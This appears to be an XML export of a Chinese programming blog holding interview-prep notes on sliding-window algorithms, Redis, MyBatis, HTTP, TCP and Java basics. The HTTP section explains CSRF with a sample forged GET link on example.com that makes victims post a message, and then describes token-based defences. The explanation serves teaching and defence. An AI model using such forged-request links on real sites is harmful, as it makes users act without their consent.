//和小于目标值，那么窗口左边也向右缩一格，这样利用r和l两个边界来控制窗口的大小，一遍头试验出所有大于s的子数组的情况，最后取出最短的出来 &#125;else&#123; sum -= nums[l]; l++; &#125; //取出比较小的值作为子数组的个数 if(sum &gt;= s)&#123; res = Math.min(res,r-l+1); &#125; &#125; //如果没有任何改变的话，说明不存在大于s的子数组 if(res == nums.length+1) return 0; return res; &#125;&#125; 3. Longest Substring Without Repeating Characters题目描述在一个字符串中寻找没有重复字母的最长字串。 Given “abcabcbb”, the answer is “abc”, which the length is 3. Given “bbbbb”, the answer is “b”, with the length of 1. Given “pwwkew”, the answer is “wke”, with the length of 3. Note that the answer must be a substring, “pwke” is a subsequence and not a substring. 大小写敏感。 代码实现123456789101112131415161718192021222324252627class Solution &#123; public int lengthOfLongestSubstring(String s) &#123; //窗口边界初始值 int l=0,r=-1; //窗口长度初始值 int res = 0; //每个字符出现的频率，进入窗口的值则为1，否则为0 //比如freq['a'] = 1，由于'a'对应的ASCII码为97，那么就是freq[97] = 1;用这个方法来判断是否重复 int[] freq = new int[256]; //将字符串改为数组 char[] sc = s.toCharArray(); while(l&lt;s.length())&#123; //窗口后面一个字符是与窗口内元素不重复的，窗口向右扩展一格 if(r+1&lt;s.length() &amp;&amp; freq[sc[r+1]] == 0)&#123; r++; freq[sc[r]] ++; &#125;else&#123; freq[sc[l]] --; l++; &#125; //比较取较大长度的窗口宽度 res = Math.max(res,r-l+1); &#125; return res; &#125;&#125;]]></content>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一、写在前面]]></title>
    <url>%2F2018%2F08%2F16%2F%E4%B8%80%E3%80%81%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2%2F</url>
    <content type="text"><![CDATA[写在前面。 以面试中常见的排序算法为例 有没有可能包含有大量重复元素？ 三路快排可能更好。 是否大部分数据距离它正确的位置很近？是否近乎有序？ 插入排序可能更好。 是否数据的取值范围非常有限？比如对学生的成绩进行排序？ 计数排序可能更好。 是否需要稳定排序？ 比如插入排序和归并排序是稳定的排序。 是否是使用链表存储的？ 归并排序可能更好。 数据的大小是否可以装载在内存中？ 外排序算法可能更好。 所以，没有最完美的算法，要根据具体的环境进行选择。 所以，在面试中，对于解决问题的路径是比较重要的。 最后，算法与数据结构本来就很难，但是大家都难，尽量表达出自己的思路(往哪个方向努力去尝试)。 ^-^ 重视基础 各种排序算法 基础数据结构和算法的实现：如堆、二叉树、图… 基础数据结构的使用：如链表、栈、队列、哈希表、图、Trie、并查集 基础算法：深度优先、广度优先、二分查找、递归… 基本算法思想：递归、分治、回溯搜索、贪心、动态规划]]></content>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[7.面试题目整理2（redis相关）]]></title>
    <url>%2F2018%2F08%2F09%2F7.%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9B%AE%E6%95%B4%E7%90%862%EF%BC%88redis%E7%9B%B8%E5%85%B3%EF%BC%89%2F</url>
    <content type="text"><![CDATA[面试题目整理2（redis相关）。 1. Redis有哪些数据结构？字符串String、字典Hash、列表List、集合Set、有序集合SortedSet。 如果你是Redis中高级用户，还需要加上下面几种数据结构HyperLogLog、Geo、Pub/Sub。 2. 使用过Redis分布式锁么，它是什么回事？先拿setnx来争抢锁，抢到之后，再用expire给锁加一个过期时间防止锁忘记了释放。如果在setnx之后执行expire之前进程意外crash或者要重启维护了，那会怎么样？可以同时把setnx和expire合成 一条指令. 3. 假如Redis里面有1亿个key，其中有10w个key是以某个固定的已知的前缀开头的，如果将它们全部找出来？使用keys指令可以扫出指定模式的key列表。 对方接着追问：如果这个redis正在给线上的业务提供服务，那使用keys指令会有什么问题？ 这个时候你要回答redis关键的一个特性：redis的单线程的。keys指令会导致线程阻塞一段时间，线上服务会停顿，直到指令执行完毕，服务才能恢复。这个时候可以使用scan指令，scan指令可以无阻塞的提取出指定模式的key列表，但是会有一定的重复概率，在客户端做一次去重就可以了，但是整体所花费的时间会比直接用keys指令长。 4. 使用过Redis做异步队列么，你是怎么用的？一般使用list结构作为队列，rpush生产消息，lpop消费消息。当lpop没有消息的时候，要适当sleep一会再重试。 如果对方追问可不可以不用sleep呢？list还有个指令叫blpop，在没有消息的时候，它会阻塞住直到消息到来。 如果对方追问能不能生产一次消费多次呢？使用pub/sub主题订阅者模式，可以实现1:N的消息队列。 如果对方追问pub/sub有什么缺点？在消费者下线的情况下，生产的消息会丢失，得使用专业的消息队列如rabbitmq等。 如果对方追问redis如何实现延时队列？使用sortedset，拿时间戳作为score，消息内容作为key调用zadd来生产消息，消费者用zrangebyscore指令获取N秒之前的数据轮询进行处理。 5. 如果有大量的key需要设置同一时间过期，一般需要注意什么？如果大量的key过期时间设置的过于集中，到过期的那个时间点，redis可能会出现短暂的卡顿现象。一般需要在时间上加一个随机值，使得过期时间分散一些。 6. Redis如何做持久化的？bgsave做镜像全量持久化，aof做增量持久化。因为bgsave会耗费较长时间，不够实时，在停机的时候会导致大量丢失数据，所以需要aof来配合使用。在redis实例重启时，优先使用aof来恢复内存的状态，如果没有aof日志，就会使用rdb文件来恢复。 如果再问aof文件过大恢复时间过长怎么办？你告诉面试官，Redis会定期做aof重写，压缩aof文件日志大小。如果面试官不够满意，再拿出杀手锏答案，Redis4.0之后有了混合持久化的功能，将bgsave的全量和aof的增量做了融合处理，这样既保证了恢复的效率又兼顾了数据的安全性。 如果对方追问那如果突然机器掉电会怎样？取决于aof日志sync属性的配置，如果不要求性能，在每条写指令时都sync一下磁盘，就不会丢失数据。但是在高性能的要求下每次都sync是不现实的，一般都使用定时sync，比如1s1次，这个时候最多就会丢失1s的数据。 如果对方追问bgsave的原理是什么？你给出两个词汇就可以了，fork和cow。fork是指redis通过创建子进程来进行bgsave操作，cow指的是copy on write，子进程创建后，父子进程共享数据段，父进程继续提供读写服务。 7. Pipeline有什么好处，为什么要用pipeline？可以将多次IO往返的时间缩减为一次，前提是pipeline执行的指令之间没有因果相关性。使用redis-benchmark进行压测的时候可以发现影响redis的QPS峰值的一个重要因素是pipeline批次指令的数目。 8. Redis的同步机制了解么？Redis可以使用主从同步，从从同步。第一次同步时，主节点做一次bgsave，并同时将后续修改操作记录到内存buffer，待完成后将rdb文件全量同步到复制节点，复制节点接受完成后将rdb镜像加载到内存。加载完成后，再通知主节点将期间修改的操作记录同步到复制节点进行重放就完成了同步过程。 9. 是否使用过Redis集群，集群的原理是什么？Redis Sentinal着眼于高可用，在master宕机时会自动将slave提升为master，继续提供服务。Redis Cluster着眼于扩展性，在单个redis内存不足时，使用Cluster进行分片存储。]]></content>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[6.面试题目整理1（myabtis相关）]]></title>
    <url>%2F2018%2F08%2F09%2F6.%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9B%AE%E6%95%B4%E7%90%861%EF%BC%88myabtis%E7%9B%B8%E5%85%B3%EF%BC%89%2F</url>
    <content type="text"><![CDATA[面试题目整理1（myabtis相关）。 1. 为什么参数化SQL查询可以防止SQL注入? 2. #{}和${}的区别是什么？标准的答案是：==#{}是预编译处理，${}是字符串替换==。mybatis在处理#{}时，会将sql中的#{}替换为?号，调用PreparedStatement的set方法来赋值；mybatis在处理${}时，就是把${}替换成变量的值。使用#{}可以有效的防止SQL注入，提高系统安全性。 对于这个题目我感觉要抓住两点： （1）$符号一般用来当作占位符，常使用Linux脚本的人应该对此有更深的体会吧。既然是占位符，当然就是被用来替换的。知道了这点就能很容易区分$和#，从而不容易记错了。 （2）预编译的机制。预编译是提前对SQL语句进行预编译，而其后注入的参数将不会再进行SQL编译。我们知道，SQL注入是发生在编译的过程中，因为恶意注入了某些特殊字符，最后被编译成了恶意的执行操作。而预编译机制则可以很好的防止SQL注入。 3. 数据库连接中断如何处理？题目：我们知道，数据库的访问底层是通过tcp实现的，如果数据库链接中断，那么应用程序是不知道的，是探测不出的，那么程序会卡住，一直在等待，会等待吓人的几十分钟，这种情况会把人郁闷死，真不如及时来个弹框，告诉用户系统暂时无法使用，让用户离开呢。所以，面对数据库连接中断的异常，该怎么设置mybatis呢？ 答案：要想吃透这个问题，要明白链接中断产生的原因。这里面会涉及到网络通信的问题。==在数据库链接中，connection操作可不是计算1+1这样的形式，它的底层是个循环处理过程，既然是循环处理过程那么自然就跟时间扯上关系了==. 跟时间有关的设置有：max_idle_time，connect_timeout。max_idle_time表明最大的空闲时间，超过这个时间socket就会关闭，这样操作系统会省心省力一些，毕竟操作系统维持一个socket也是花费不少精力的。connect_timeout表明链接的超时时间，我们知道，网络环境就是跟潮水一样，一波一波的，总是在波动，即使数据库服务器活的杠杠的，但是因为网络用塞，客户端仍然连不上服务器端，这个时候就要设置timeout，别一直傻等着。 4. 数据库插入重复如何处理问题：在开发过程中，经常遇到插入重复的现象，这种情况该如何解决呢？ 答案：插入的过程一般都是分两步的：先判断是否存在记录，没有存在则插入否则不插入。如果存在并发操作，那么同时进行了第一步，然后大家都发现没有记录，然后都插入了数据从而造成数据的重复。解决插入重复的思路可以是这样的： （1）判断数据库是否有数据，有的话则无所作为。没有数据的话，则进行下面第2步 （2）向redis set key，其中只有一个操作a会成功，其他并发的操作b和c会失败的 （3）上面set key 成功的操作a，开始执行插入数据操作，无论是否插入数据成功，都在最后del key。【注】插入不成功可以多尝试几次，增加成功的概率。 （4）上面set key 失败的操作b和c，sleep一下，然后再判断数据库是否有数据，有数据则无所做为，没有数据则重复上面的set key，此时是b和c在竞争，失败者则无所作为，成功者则开始插入数据，然后无论插入成功还是失败则都要del key。【注】既然是并发了，本身就是异常情况，就没有必要考虑用户体验了，就可以多sleep一会儿也无妨，不过对于单线程多事件处理的开发模式不要sleep太久。 总之，上面的过程就是：线程a 线程b 线程c，同时插入数据。如果线程a拿到锁之后，让它插入数据，它插入成功了，那么线程b 线程c啥也不用做；它插入失败了，线程b 线程c则抢锁，谁抢到了谁插入数据，不管最后是否成功，程序走到此步就可以了，已经完成了既定两个目标：执行插入，不重复插入。 5. 事务执行过程中宕机的应对处理方式问题：数据库插入百万级数据的时候，还没操作完，但是把服务器重启了，数据库会继续执行吗？ 还是直接回滚了？ 答案：不会自动继续执行，不会自动直接回滚，但是可以人工手动选择继续执行或者直接回滚，依据是事务日志。 事务开启时，事务中的操作，都会先写入存储引擎的日志缓冲中，在事务提交之前，这些缓冲的日志都需要提前刷新到磁盘上持久化，这就是人们口中常说的“日志先行”(Write-Ahead Logging)。 日志分为两种类型：redo log和undo log. （1）redo log 在系统启动的时候，就已经为redo log分配了一块连续的存储空间，以顺序追加的方式记录redo log，通过顺序io来改善性能。所有的事务共享redo log的存储空间，它们的redo log按语句的执行顺序，依次交替的记录在一起。如下一个简单示例： 12345记录1：&lt;trx1, insert...&gt;记录2：&lt;trx2, delete...&gt;记录3：&lt;trx3, update...&gt;记录4：&lt;trx1, update...&gt;记录5：&lt;trx3, insert...&gt; 此时如果数据库崩溃或者宕机，那么当系统重启进行恢复时，就可以根据redo log中记录的日志，把数据库恢复到崩溃前的一个状态。未完成的事务，可以继续提交，也可以选择回滚，这基于恢复的策略而定。 （2）undo log undo log主要为事务的回滚服务。在事务执行的过程中，除了记录redo log，还会记录一定量的undo log。undo log记录了数据在每个操作前的状态，如果事务执行过程中需要回滚，就可以根据undo log进行回滚操作。单个事务的回滚，只会回滚当前事务做的操作，并不会影响到其他的事务做的操作。 以下是undo+redo事务的简化过程，假设有2个数值，分别为A和B，值为1，2 123456789start transaction;记录 A=1 到undo log;update A = 3；记录 A=3 到redo log；记录 B=2 到undo log；update B = 4；记录B = 4 到redo log；将redo log刷新到磁盘commit 在1-8的任意一步系统宕机，事务未提交，该事务就不会对磁盘上的数据做任何影响。如果在8-9之间宕机，恢复之后可以选择回滚，也可以选择继续完成事务提交，因为此时redo log已经持久化。若在9之后系统宕机，内存映射中变更的数据还来不及刷回磁盘，那么系统恢复之后，可以根据redo log把数据刷回磁盘。所以，redo log其实保障的是事务的持久性和一致性，而undo log则保障了事务的原子性。 6. Java客户端中的一个Connection问题问题：Java客户端中的一个Connection是不是在MySQL中就对应一个线程来处理这个连接呢？ 答案：不是。凡是从线程思考问题的人，一般都是被Java技术的多线程思想所禁锢了，其实==在高性能服务器端端开发底层往往靠io复用来处理==，这种模式就是：==单线程+事件处理机制==。在MySQL里面往往有一个主线程，这是单线程（与Java中处处强调多线程的思想有点不同哦），它不断的循环查看是否有socket是否有读写事件，如果有读写事件，再从线程池里面找个工作线程处理这个socket的读写事件，完事之后工作线程会回到线程池。所以：Java客户端中的一个Connection不是在MySQL中就对应一个线程来处理这个链接，而是由监听socket的主线程+线程池里面固定数目的工作线程来处理的。]]></content>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[5.Http的简单介绍]]></title>
    <url>%2F2018%2F08%2F09%2F5.Http%E7%9A%84%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D%2F</url>
    <content type="text"><![CDATA[Http的简单介绍。 HTTP 请求HTTP 协议是以 ASCII 码传输，建立在 TCP/IP 协议之上的应用层规范。规范把 HTTP 请求分为三个部分：状态行、请求头、消息主体。类似于下面这样： 1234&lt;method&gt; &lt;request-URL&gt; &lt;version&gt;&lt;headers&gt;&lt;entity-body&gt; HTTP 响应HTTP 响应与 HTTP 请求相似，HTTP响应也由3个部分构成，分别是： 123状态行响应头(Response Header)响应正文 常见的状态码有如下几种： 200 OK 客户端请求成功 301 Moved Permanently 请求永久重定向 302 Moved Temporarily 请求临时重定向 304 Not Modified 文件未修改，可以直接使用缓存的文件。 400 Bad Request 由于客户端请求有语法错误，不能被服务器所理解。 401 Unauthorized 请求未经授权。这个状态代码必须和WWW-Authenticate报头域一起使用 403 Forbidden 服务器收到请求，但是拒绝提供服务。服务器通常会在响应正文中给出不提供服务的原因 404 Not Found 请求的资源不存在，例如，输入了错误的URL 500 Internal Server Error 服务器发生不可预期的错误，导致无法完成客户端的请求。 503 Service Unavailable 服务器当前不能够处理客户端的请求，在一段时间之后，服务器可能会恢复正常。 会话跟踪 什么是会话？ 客户端打开与服务器的连接发出请求到服务器响应客户端请求的全过程称之为会话。 什么是会话跟踪？ 会话跟踪指的是对同一个用户对服务器的连续的请求和接受响应的监视。 为什么需要会话跟踪？ 浏览器与服务器之间的通信是通过HTTP协议进行通信的，而HTTP协议是”无状态”的协议，它不能保存客户的信息，即一次响应完成之后连接就断开了，下一次的请求需要重新连接，这样就需要判断是否是同一个用户，所以才有会话跟踪技术来实现这种要求。 会话跟踪常用的方法: URL重写 URL(统一资源定位符)是Web上特定页面的地址，URL重写的技术就是在URL结尾添加一个附加数据以标识该会话,把会话ID通过URL的信息传递过去，以便在服务器端进行识别不同的用户。 隐藏表单域 将会话ID添加到HTML表单元素中提交到服务器，此表单元素并不在客户端显示 Cookie Cookie是Web服务器发送给客户端的一小段信息，客户端请求时可以读取该信息发送到服务器端，进而进行用户的识别。对于客户端的每次请求，服务器都会将Cookie发送到客户端,在客户端可以进行保存,以便下次使用。 客户端可以采用两种方式来保存这个Cookie对象，一种方式是保存在客户端内存中，称为临时Cookie，浏览器关闭后这个Cookie对象将消失。另外一种方式是保存在客户机的磁盘上，称为永久Cookie。以后客户端只要访问该网站，就会将这个Cookie再次发送到服务器上，前提是这个Cookie在有效期内，这样就实现了对客户的跟踪。 Cookie是可以被禁止的。 Session: 每一个用户都有一个不同的session，各个用户之间是不能共享的，是每个用户所独享的，在session中可以存放信息。 在服务器端会创建一个session对象，产生一个sessionID来标识这个session对象，然后将这个sessionID放入到Cookie中发送到客户端，下一次访问时，sessionID会发送到服务器，在服务器端进行识别不同的用户。 Session的实现依赖于Cookie，如果Cookie被禁用，那么session也将失效。 跨站攻击CSRF（Cross-site request forgery，跨站请求伪造） CSRF(XSRF) 顾名思义，是伪造请求，冒充用户在站内的正常操作。 例如，一论坛网站的发贴是通过 GET 请求访问，点击发贴之后 JS 把发贴内容拼接成目标 URL 并访问： 1http://example.com/bbs/create_post.php?title=标题&amp;content=内容 那么，我们只需要在论坛中发一帖，包含一链接： 1http://example.com/bbs/create_post.php?title=我是脑残&amp;content=哈哈 只要有用户点击了这个链接，那么他们的帐户就会在不知情的情况下发布了这一帖子。可能这只是个恶作剧，但是既然发贴的请求可以伪造，那么删帖、转帐、改密码、发邮件全都可以伪造。 如何防范CSRF 攻击？ 关键操作只接受POST请求 Token 目前主流的做法是使用 Token 抵御 CSRF 攻击。下面通过分析 CSRF 攻击来理解为什么 Token 能够有效 CSRF攻击要成功的条件在于攻击者能够预测所有的参数从而构造出合法的请求。所以根据不可预测性原则，我们可以对参数进行加密从而防止CSRF攻击。 另一个更通用的做法是保持原有参数不变，另外添加一个参数Token，其值是随机的。这样攻击者因为不知道Token而无法构造出合法的请求进行攻击。]]></content>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[4.TCP和UDP]]></title>
    <url>%2F2018%2F08%2F09%2F4.TCP%E5%92%8CUDP%2F</url>
    <content type="text"><![CDATA[TCP和UDP的经典问题。 UDP简介UDP 是一个简单的传输层协议。和 TCP 相比，UDP 有下面几个显著特性： UDP 缺乏可靠性。UDP 本身不提供确认，序列号，超时重传等机制。UDP 数据报可能在网络中被复制，被重新排序。即 UDP 不保证数据报会到达其最终目的地，也不保证各个数据报的先后顺序，也不保证每个数据报只到达一次 UDP 数据报是有长度的。每个 UDP 数据报都有长度，如果一个数据报正确地到达目的地，那么该数据报的长度将随数据一起传递给接收方。而 TCP 是一个字节流协议，没有任何（协议上的）记录边界。 UDP 是无连接的。UDP 客户和服务器之前不必存在长期的关系。UDP 发送数据报之前也不需要经过握手创建连接的过程。 UDP 支持多播和广播。 TCP简介 TCP 提供一种面向连接的、可靠的字节流服务 在一个 TCP 连接中，仅有两方进行彼此通信。广播和多播不能用于 TCP TCP 使用校验和，确认和重传机制来保证可靠传输 TCP 给数据分节进行排序，并使用累积确认保证数据的顺序不变和非重复 TCP 使用滑动窗口机制来实现流量控制，通过动态改变窗口的大小进行拥塞控制 注意：TCP 并不能保证数据一定会被对方接收到，因为这是不可能的。TCP 能够做到的是，如果有可能，就把数据递送到接收方，否则就（通过放弃重传并且中断连接这一手段）通知用户。因此准确说 TCP 也不是 100% 可靠的协议，它所能提供的是数据的可靠递送或故障的可靠通知。 三次握手所谓三次握手(Three-way Handshake)，是指建立一个 TCP 连接时，需要客户端和服务器总共发送3个包。 三次握手的目的是连接服务器指定端口，建立 TCP 连接，并同步连接双方的序列号和确认号，交换 TCP 窗口大小信息。在 socket 编程中，客户端执行 connect() 时。将触发三次握手。 第一次握手(SYN=1, seq=x): 客户端发送一个 TCP 的 SYN 标志位置1的包，指明客户端打算连接的服务器的端口，以及初始序号 X,保存在包头的序列号(Sequence Number)字段里。 发送完毕后，客户端进入 SYN_SEND 状态。 第二次握手(SYN=1, ACK=1, seq=y, ACKnum=x+1): 服务器发回确认包(ACK)应答。即 SYN 标志位和 ACK 标志位均为1。服务器端选择自己 ISN 序列号，放到 Seq 域里，同时将确认序号(Acknowledgement Number)设置为客户的 ISN 加1，即X+1。 发送完毕后，服务器端进入 SYN_RCVD 状态。 第三次握手(ACK=1，ACKnum=y+1) 客户端再次发送确认包(ACK)，SYN 标志位为0，ACK 标志位为1，并且把服务器发来 ACK 的序号字段+1，放在确定字段中发送给对方，并且在数据段放写ISN的+1 发送完毕后，客户端进入 ESTABLISHED 状态，当服务器端接收到这个包时，也进入 ESTABLISHED 状态，TCP 握手结束。 三次握手的过程的示意图如下： 四次挥手TCP 的连接的拆除需要发送四个包，因此称为四次挥手(Four-way handshake)，也叫做改进的三次握手。客户端或服务器均可主动发起挥手动作，在 socket 编程中，任何一方执行 close() 操作即可产生挥手操作。 第一次挥手(FIN=1，seq=x) 假设客户端想要关闭连接，客户端发送一个 FIN 标志位置为1的包，表示自己已经没有数据可以发送了，但是仍然可以接受数据。 发送完毕后，客户端进入 FIN_WAIT_1 状态。 第二次挥手(ACK=1，ACKnum=x+1) 服务器端确认客户端的 FIN 包，发送一个确认包，表明自己接受到了客户端关闭连接的请求，但还没有准备好关闭连接。 发送完毕后，服务器端进入 CLOSE_WAIT 状态，客户端接收到这个确认包之后，进入 FIN_WAIT_2 状态，等待服务器端关闭连接。 第三次挥手(FIN=1，seq=y) 服务器端准备好关闭连接时，向客户端发送结束连接请求，FIN 置为1。 发送完毕后，服务器端进入 LAST_ACK 状态，等待来自客户端的最后一个ACK。 第四次挥手(ACK=1，ACKnum=y+1) 客户端接收到来自服务器端的关闭请求，发送一个确认包，并进入 TIME_WAIT状态，等待可能出现的要求重传的 ACK 包。 服务器端接收到这个确认包之后，关闭连接，进入 CLOSED 状态。 客户端等待了某个固定时间（两个最大段生命周期，2MSL，2 Maximum Segment Lifetime）之后，没有收到服务器端的 ACK ，认为服务器端已经正常关闭连接，于是自己也关闭连接，进入 CLOSED 状态。 四次挥手的示意图如下： 为什么要采用三次握手，两次不行吗？还要再发送一次确认是为了，防止已失效的连接请求报文段突然又传到了B，因而产生错误。 已失效的报文段：正常情况下：A发出连接请求，但因为丢失了，故而不能收到B的确认。于是A重新发出请求，然后收到确认，建立连接，数据传输完毕后，释放连接，A发了2个，一个丢掉，一个到达，没有“已失效的报文段” 但是，某种情况下，A的第一个在某个节点滞留了，延误到达，本来这是一个早已失效的报文段，但是在A发送第二个，并且得到B的回应，建立了连接以后，这个报文段竟然到达了，于是B就认为，A又发送了一个新的请求，于是发送确认报文段，同意建立连接，假若没有三次的握手，那么这个连接就建立起来了（有一个请求和一个回应），此时，A收到B的确认，但A知道自己并没有发送建立连接的请求，因为不会理睬B的这个确认，于是呢，A也不会发送任何数据，而B呢却以为新的连接建立了起来，一直等待A发送数据给自己，此时B的资源就被白白浪费了。但是采用三次握手的话，A就不发送确认，那么B由于收不到确认，也就知道并没有要求建立连接。 简而言之：第三次握手，主机A发送一次确认是为了防止：如果客户端迟迟没有收到服务器返回的确认报文，这时他会放弃连接，重新启动一条连接请求；但问题是：服务器不知客户端没收到，所以他会收到两个连接请求，白白浪费了一条连接开销。 为什么要等待2MSL呢? 为了保证A发送的最后一个ACK报文段能够到达B。 即最后这个确认报文段很有可能丢失，那么B会超时重传，然后A再一次确认，同时启动2MSL计时器，如此下去。如果没有等待时间，发送完确认报文段就立即释放连接的话，B就无法重传了（连接已被释放，任何数据都不能出传了），因而也就收不到确认，就无法按照步骤进入CLOSE状态，即必须收到确认才能close。 防止“已失效的连接请求报文段”出现在连接中。 经过2MSL，那些在这个连接持续的时间内，产生的所有报文段就可以都从网络中消失。即在这个连接释放的过程中会有一些无效的报文段滞留在楼阁结点，但是呢，经过2MSL这些无效报文段就肯定可以发送到目的地，不会滞留在网络中。这样的话，在下一个连接中就不会出现上一个连接遗留下来的请求报文段了。 可以看出 B结束TCP连接的时间比A早一点，因为B收到确认就断开连接了，而A还得等待2MSL. 为什么TCP释放连接需要四次？因为当Server端收到Client端的SYN连接请求报文后，可以直接发送SYN+ACK报文。其中ACK报文是用来应答的，SYN报文是用来同步的。但是关闭连接时，当Server端收到FIN报文时，很可能并不会立即关闭SOCKET，所以只能先回复一个ACK报文，告诉Client端，”你发的FIN报文我收到了”。只有等到我Server端所有的报文都发送完了，我才能发送FIN报文，因此不能一起发送。故需要四步握手。 发送了FIN只是表示这端不能继续发送数据(应用层不能再调用send发送)，但是还可以接收数据。]]></content>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[3.java基础-高频面试知识点]]></title>
    <url>%2F2018%2F08%2F09%2F3.java%E5%9F%BA%E7%A1%80-%E9%AB%98%E9%A2%91%E9%9D%A2%E8%AF%95%E7%9F%A5%E8%AF%86%E7%82%B9%2F</url>
    <content type="text"><![CDATA[java基础一点的面试问题。 1. 面向对象的特征有哪些方面有四大基本特征:封装、抽象、继承、多态。 封装 即将对象封装成一个高度自治和相对封闭的个体，对象状态（属性）由这个对象自己的行为（方法）来读取和改变。张三这个人，他的姓名等属性，要有自己提供的获取或改变的方法来操作。private name setName getName 抽象 找出一些事物的相似和共性之处，然后将这些事物归为一个类，这个类只考虑这些事物的相似和共性之处，并且会忽略与当前主题和目标无关的那些方面，将注意力集中在与当前目标有关的方面。 就是把现实生活中的对象，抽象为类。 继承 在定义和实现一个类的时候，可以在一个已经存在的类的基础之上来进行，把这个已经存在的类所定义的内容作为自己的内容，并可以加入若干新的内容，或修改原来的方法使之更适合特殊的需要，这就是继承。 多态 程序中定义的引用变量所指向的具体类型和通过该引用变量发出的方法调用在编程时并不确定，而是在程序运行期间才确定，即一个引用变量倒底会指向哪个类的实例对象，该引用变量发出的方法调用到底是哪个类中实现的方法，必须在由程序运行期间才能决定。 123Object obj = new xxx();UserDao userDao = new UserDaoJdbcImpl();UserDao userDao = new UserDaoHibernateImpl(); 靠的是父类或接口定义的引用变量可以指向子类或具体实现类的实例对象，而程序调用的方法在运行期才动态绑定，就是引用变量所指向的具体实例对象的方法，也就是内存里正在运行的那个对象的方法，而不是引用变量的类型中定义的方法。 补充：继承和组合 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114//InheritTest.java 使用继承方式实现目标 class Animal&#123; private void beat()&#123; System.out.println("心脏跳动..."); &#125; public void breath()&#123; beat(); //呼吸一次，心脏要跳一次 System.out.println("吸一口气，呼一口气，呼吸中..."); &#125; &#125; //继承Animal，直接复用父类的breath()方法 class Bird extends Animal&#123; //创建子类独有的方法fly() public void fly()&#123; System.out.println("我是鸟，我在天空中自由的飞翔..."); &#125; &#125; //继承Animal，直接复用父类的breath()方法 class Wolf extends Animal&#123; //创建子类独有的方法run() public void run()&#123; System.out.println("我是狼，我在草原上快速奔跑..."); &#125; &#125; public class InheritTest&#123; public static void main(String[] args)&#123; //创建继承自Animal的Bird对象新实例b Bird b=new Bird(); //新对象实例b可以breath() b.breath(); //新对象实例b可以fly() b.fly(); Wolf w=new Wolf(); w.breath(); w.run(); /* ---------- 运行Java程序 ---------- 心脏跳动... 吸一口气，呼一口气，呼吸中... 我是鸟，我在天空中自由的飞翔... 心脏跳动... 吸一口气，呼一口气，呼吸中... 我是狼，我在草原上快速奔跑... 输出完毕 (耗时 0 秒) - 正常终止 */ &#125; &#125; //CompositeTest.java 使用组合方式实现目标 class Animal&#123; private void beat()&#123; System.out.println("心脏跳动..."); &#125; public void breath()&#123; beat(); System.out.println("吸一口气，呼一口气，呼吸中..."); &#125; &#125; class Bird&#123; //定义一个Animal成员变量，以供组合之用 private Animal a; //使用构造函数初始化成员变量 public Bird(Animal a)&#123; this.a=a; &#125; //通过调用成员变量的固有方法（a.breath()）使新类具有相同的功能（breath()） public void breath()&#123; a.breath(); &#125; //为新类增加新的方法 public void fly()&#123; System.out.println("我是鸟，我在天空中自由的飞翔..."); &#125; &#125; class Wolf&#123; private Animal a; public Wolf(Animal a)&#123; this.a=a; &#125; public void breath()&#123; a.breath(); &#125; public void run()&#123; System.out.println("我是狼，我在草原上快速奔跑..."); &#125; &#125; public class CompositeTest&#123; public static void main(String[] args)&#123; //显式创建被组合的对象实例a1 Animal a1=new Animal(); //以a1为基础组合出新对象实例b Bird b=new Bird(a1); //新对象实例b可以breath() b.breath(); //新对象实例b可以fly() b.fly(); Animal a2=new Animal(); Wolf w=new Wolf(a2); w.breath(); w.run(); /* ---------- 运行Java程序 ---------- 心脏跳动... 吸一口气，呼一口气，呼吸中... 我是鸟，我在天空中自由的飞翔... 心脏跳动... 吸一口气，呼一口气，呼吸中... 我是狼，我在草原上快速奔跑... 输出完毕 (耗时 0 秒) - 正常终止 */ &#125; &#125; 详细比较：http://www.cnblogs.com/whitewolf/archive/2010/05/03/1726519.html 2. 讲一下String和StringBuilder的区别(final)？StringBuffer和StringBuilder的区别?2.1 在java中提供三个类String StringBuillder StringBuffer来表示和操作字符串。字符串就是多个字符的集合。String是内容不可变的字符串。String底层使用了一个不可变的字符数组(final char[]) 2.2 而StringBuillder StringBuffer,是内容可以改变的字符串。StringBuillder StringBuffer底层使用的可变的字符数组（没有使用final来修饰） 2.3 最经典就是拼接字符串。 1231、String进行拼接.String c = “a”+”b”;//产生三个对象2、StringBuilder或者StringBuffer StringBuilder sb = new StringBuilder(); sb.apend(“a”).apend(“b”) 拼接字符串不能使用String进行拼接，要使用StringBuilder或者StringBuffer 2.4 StringBuilder是线程不安全的，效率较高.而StringBuffer是线程安全的，效率较低。 3. 讲一下HashMap哈HashTable的区别?HashTable和ConcurrentHashMap的区别? 相同点 HashMap和HasheTalbe都可以使用来存储key–value的数据。 区别 1、HashMap是可以把null作为key或者value的，而HashTable是不可以的。 2、HashMap是线程不安全的，效率较高。而HashTalbe是线程安全的，效率较低。 我想线程安全但是我又想效率高？ 通过把整个Map分为N个Segment（类似HashTable），可以提供相同的线程安全，但是效率提升N倍，默认提升16倍。 4. 线程池的作用？1、限定线程的个数，不会导致由于线程过多导致系统运行缓慢或崩溃 2、线程池不需要每次都去创建或销毁，节约了资源、 3、线程池不需要每次都去创建，响应时间更快。 5. 讲一下http get和post请求的区别? 相同点 GET和POST请求都是http的请求方式，用户通过不同的http的请求方式完成对资源（url）的不同操作。 GET，POST，PUT，DELETE就对应着对这个资源的查 ，改 ，增 ，删 4个操作,具体点来讲GET一般用于获取/查询资源信息，而POST一般用于更新资源信息. 不同点 Get请求提交的数据会在地址栏显示出来，而post请求不会再地址栏显示出来. 传输数据的大小:http Get请求由于浏览器对地址长度的限制而导致传输的数据有限制。而POST请求不会因为地址长度限制而导致传输数据限制 